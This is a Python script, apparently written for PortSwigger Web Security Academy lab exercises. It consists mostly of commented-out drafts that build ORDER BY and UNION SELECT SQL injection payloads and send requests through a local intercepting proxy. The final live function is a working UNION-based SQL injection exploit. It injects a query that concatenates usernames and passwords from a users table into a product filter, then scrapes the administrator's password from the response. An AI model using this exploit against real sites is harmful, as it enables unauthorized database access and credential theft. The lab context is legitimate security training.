#hey hello

# # # # import requests
# # # # import urllib3

# # # # urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# # # # url = "https://0abb00ce04dab5dc815b66ba00aa0020.web-security-academy.net/"
# # # # proxies={"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

# # # # res = requests.get(url=url,verify=False)

# # # # # print(res.text)

# # # # if "Dancing" in res.text:
# # # #     print("Succesfull")
# # # # else:
# # # #     print("Unsuccessfull")

# # # import requests
# # # import os
# # # import ssl


# # # # os.environ['http_proxy'] = proxy 
# # # # os.environ['HTTP_PROXY'] = proxy
# # # # os.environ['https_proxy'] = proxy
# # # # os.environ['HTTPS_PROXY'] = proxy
# # # # os.environ['REQUESTS_CA_BUNDLE'] = "/home/Downloads/cacert.pem"
# # # path="/home/Downloads/cacert.pem"
# # # # ssl_context = ssl.create_default_context()
# # # # ssl_context.load_verify_locations(cafile="/home/Downloads/cacert.der")
# # # proxies={
# # #     'http':'http://127.0.0.1:8080',
# # #     'https':'http://127.0.0.1:8080'
# # # }
# # # #url = "http://httpbin.org"
# # # url = "portswigger.net"
# # # if "http" or "https" not in url:
# # #     url="http://"+url
# # # res=requests.get(url,proxies=proxies,verify=False)
# # # print(res.text)

# # # # for i in range(1,10):
# # # #     payload="' ORDER BY {} --".format(i)
# # # #     print(payload)

# # # for i in range(1,5):
# # #     string="dcdd"
# # #     l=['null']*5
# # #     l[i-1]=string
# # #     payload="'+union+select+"+",+".join(l)+"+--"
# # #     print(payload)

# # import requests

# # url="https://portswigger.net"

# # rs=requests.get(url)

# # from bs4 import BeautifulSoup

# # soup=BeautifulSoup(rs.text,'html.parser')
# # print(soup)

# import requests
# import sys
# proxy={
#      'http':'http://127.0.0.1:8080',
#      'https':'http://127.0.0.1:8080'
# }

# url=sys.argv[1]
# path="/login"


# res=requests.get(url+path,proxies=proxy,verify=False)
# from bs4 import BeautifulSoup

# soup = BeautifulSoup(res.text)
# print(soup.find("input")["value"])
import requests
import re
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

column_list=[2]
ncolumn=2
url = "https://0ac0001a03ece1d2810f2a3600640064.web-security-academy.net"

def admin_password(url,column_list,ncolumn):
    path="/filter?category=Gifts"
    for i in range(1,ncolumn+1):
        payload_list = ['null']*ncolumn
        if i in column_list:
                payload_list[i-1] = "username || '*' || password"
                payload = "' union select "+",".join(payload_list)+" from users"+" --"
                res = requests.get(url+path+payload,verify=False)
                if "administrator" in res.text:
                        print("Administrator found.......")
                        soup = BeautifulSoup(res.text,'html.parser')
                        password = soup.find(string=re.compile('.*administrator.*')).split('*')[1]
                        print("password= "+password)
    return password

passs = admin_password(url,column_list,ncolumn)
print(passs)
